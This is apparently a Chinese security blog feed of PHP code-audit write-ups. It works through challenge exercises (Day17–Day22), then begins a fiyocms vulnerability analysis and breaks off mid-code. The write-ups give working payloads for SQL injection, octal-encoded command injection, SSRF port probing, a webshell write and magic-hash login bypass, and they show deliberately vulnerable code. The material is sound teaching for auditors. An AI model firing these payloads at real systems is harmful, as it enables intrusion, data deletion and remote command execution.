class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure><p>就可以利用ftp协议来删除文件了</p><h2 id="Day17"><a href="#Day17" class="headerlink" title="Day17"></a>Day17</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"bootstrap.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">"COUNT(u)"</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"u.password = '$pass' AND u.user = '$user'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addslashes($input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">    $_POST[<span class="string">'user'</span>],</span><br><span class="line">    $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Hello, '</span>.$_POST[<span class="string">'user'</span>];</span><br></pre></td></tr></table></figure><p>这题看起来是Day13的升级版，那题我们是利用<strong>addslashes</strong>和字符串截断进行<code>\</code>逃逸，从而进行SQL注入。这题对$pass进行了md5加密，但这里我们注意到md5函数中加入了参数<strong>true</strong>，我们可以测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(<span class="number">1</span>));</span><br><span class="line">var_dump(md5(<span class="number">1</span>,<span class="keyword">true</span>));</span><br></pre></td></tr></table></figure><p>输出的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(32) &quot;c4ca4238a0b923820dcc509a6f75849b&quot; </span><br><span class="line">string(16) &quot;��B8��#� �P�ou��&quot;</span><br></pre></td></tr></table></figure><p>看出加入true参数后与原来输出是有区别的，那么我们可以进行<strong>fuzz</strong>测试，看看有没有md5处理后最后一个字符为<code>\</code></p><p>测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i++;)&#123;</span><br><span class="line">$key = md5($i,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(substr($key,strlen($key)<span class="number">-1</span>,<span class="number">1</span>) == <span class="string">'\\'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$i = '</span>.$i.<span class="string">' $key = '</span>.$key;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$i = 128 $key = v�an���l���q��\</span><br></pre></td></tr></table></figure><p>所以我们就可以构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass=128&amp;user=&apos; or 1=1#</span><br></pre></td></tr></table></figure><p>从而进行SQL注入</p><h2 id="Day18"><a href="#Day18" class="headerlink" title="Day18"></a>Day18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">        $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">        $signature = base64_decode($signature);</span><br><span class="line">        <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">            $object = json_decode(base64_decode($data));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题没怎么看懂，大致是利用<code>openssl_verify</code>遇到错误时会返回-1，而if语句只有判断为0和false才不会执行。</p><h2 id="Day19"><a href="#Day19" class="headerlink" title="Day19"></a>Day19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $e = stripcslashes(</span><br><span class="line">            preg_replace(</span><br><span class="line">                <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">                <span class="string">''</span>,</span><br><span class="line">                <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        system(<span class="string">"/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e</span></span><br><span class="line"><span class="string">                ./thumbs/&#123;$this-&gt;file&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;a href=&#123;$this-&gt;file&#125;&gt;</span></span><br><span class="line"><span class="string">                &lt;img src=./thumbs/&#123;$this-&gt;file&#125;&gt;&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题关键在于<code>stripcslashes</code>函数，它能返回反转义后的字符串。可识别类似 C 语言的 <em>\n</em>，<em>\r</em>，… 八进制以及十六进制的描述。</p><p>而下面的正则匹配过滤过滤掉除了<code>0-9</code>和反斜杠<code>\</code>，所以我们可以将我们要执行的命令转化为八进制，这样就可以构成任意命令执行的漏洞</p><p>例如执行sleep命令，将<code>0;sleep 5;</code>转化为八进制为<code>0\073\163\154\145\145\160\0405\073</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?size=0\073\163\154\145\145\160\0405\073</span><br></pre></td></tr></table></figure><h2 id="Day20"><a href="#Day20" class="headerlink" title="Day20"></a>Day20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET) || $_GET == <span class="keyword">false</span>)&#123;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $image = file_get_contents($uri);</span><br><span class="line">            $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">            file_put_contents($path, $image);</span><br><span class="line">            <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">                unlink($path);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">                $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure><p>这关考察的是利用<code>file_get_contents</code>函数通过<code>set_error_handler</code>产生报错信息来产生SSRF，我们可以通过SSRF来检测内部服务是否开启，例如输入payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img=http://127.0.0.1:22</span><br></pre></td></tr></table></figure><p>如果响应结果为：<code>There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code>则说明存在SSH服务</p><p>如果检测一个不存在端口<code>?img=http://127.0.0.1:30</code>，则响应<code>There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused</code>，说明服务不存在</p><h2 id="Day21"><a href="#Day21" class="headerlink" title="Day21"></a>Day21</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">        $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">        $params = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">            $params[] = $parameters[$index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这道题需要运行在<strong>php7</strong>的环境，开头的<code>declare(strict_types=1);</code>就是php7的一种新引入方式，作用是在函数调用时会对参数进行类型检查，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int $a,int $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> $a + $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> addnum(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//输出3</span></span><br><span class="line"><span class="keyword">echo</span> addnum(<span class="string">'1'</span>,<span class="string">'2'</span>); <span class="comment">//Fatal error: Uncaught TypeError:的错误</span></span><br></pre></td></tr></table></figure><p>所以这就保证了最后通过<code>$validate</code>函数的<code>$value</code>都是数字且都大于0，但是这题漏洞在于<code>array_walk</code>这个函数，它不会对传入的参数做类型检查，也就是说它还是会按照php本身弱类型语言的特性对传入的参数做类型转化</p><p>例子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int &amp;$value)</span> </span>&#123;</span><br><span class="line">    $value = $value+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$input = <span class="keyword">array</span>(<span class="string">'1a'</span>,<span class="string">'2b'</span>);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input); <span class="comment">#array(2) &#123; [0]=&gt; int(2) [1]=&gt; int(3) &#125;</span></span><br></pre></td></tr></table></figure><p>所以，我们很容易就能够进行任意命令执行，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?p[1]=1;touch info.php</span><br><span class="line">?p[1]=1;echo &apos;&lt;?php phpinfo(); ?&gt;&apos; &gt;&gt; info.php</span><br></pre></td></tr></table></figure><p>这样就能向当前目录写入webshell</p><h2 id="Day22"><a href="#Day22" class="headerlink" title="Day22"></a>Day22</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">       . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题考察的就是PHP会将<code>0e</code>开头的值以科学计数法进行处理，例如<code>0e123 == 0e321</code></p><p>这里<code>cookie</code>字段我们是可控的，所以我们只需要找到一个经过md5加密后开头是0e的值即可</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: hash=QNKCDZO</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--fiyocms</title>
    <link href="https://Foxgrin.github.io//posts/42478/"/>
    <id>https://Foxgrin.github.io//posts/42478/</id>
    <published>2019-03-01T07:07:00.000Z</published>
    <updated>2019-03-02T08:48:01.938Z</updated>
    
    <content type="html"><![CDATA[<p>记录fiyocms审计过程以及漏洞分析<a id="more"></a></p><h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>该CMS的核心分析页面是在/dapur/index.php中，这是一个管理员的后台管理页面，首先需要以管理的身份进行登录，登录后，我们可以发现，访问其中很多具体管理页面，都是通过GET方式向服务器提交参数，如添加用户功能，提交的是app参数和act参数，那么我们在Seay审计系统中通过全局搜索功能搜索关键参数<strong>app</strong>,观察是哪个具体的文件接收了这个参数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fiyocms/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出，/dapur/system/apps.php文件接收了<strong>app</strong>参数，于是跟进该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($app))&#123;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">"apps/app_$app/app_$app.php"</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sysAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">htmlRedirect(<span class="string">'../'</span>.siteConfig(<span class="string">'backend_folder'</span>));</span><br><span class="line"><span class="comment">/* blank line */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">/* blank line */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sysAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$app=$_REQUEST[<span class="string">'app'</span>]; </span><br><span class="line">baseSystem($app);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAdminApps</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$app=$_REQUEST[<span class="string">'app'</span>]; </span><br><span class="line">baseApps(<span class="string">"app_"</span>.$app);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当接收到app参数时，做出判断apps/app_$app/app_$app.php文件是否存在，如果存在定义两个方法：sysAdminApps()和loadAdminApps()，其中又调用了baseSystem()和baseApps()方法，我们继续搜索这两个方法的出处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baseApps</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">require</span> (<span class="string">"apps/$file/$file.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">baseSystem</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">$file = <span class="string">"apps/app_$file/sys_$file.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以这两个方法发现包含了两个关键性文件，所以，管理界面每个功能都包含了两个关键文件，例如添加用户功能（$app=user），那么就有两个关键文件：apps/app_user/app_user.php和apps/app_user/sys_user.php需要我们去关注</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>/dapur/apps/app_config/controller/backuper.php 第16-30行</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'type'</span>] == <span class="string">'database'</span>) &#123;</span><br><span class="line">@unlink(<span class="string">"../../../../.backup/$_POST[file]"</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">'../../../../.backup'</span>))</span><br><span class="line">mkdir(<span class="string">'../../../../.backup'</span>);</span><br><span class="line">$date = md5(date(<span class="string">"Ymd:His"</span>));</span><br><span class="line">$file = <span class="string">"db-backup-$date"</span>;</span><br><span class="line">$c = backup_tables(<span class="string">"*"</span>,<span class="string">'../../../../.backup'</span>,<span class="string">"$file"</span>,<span 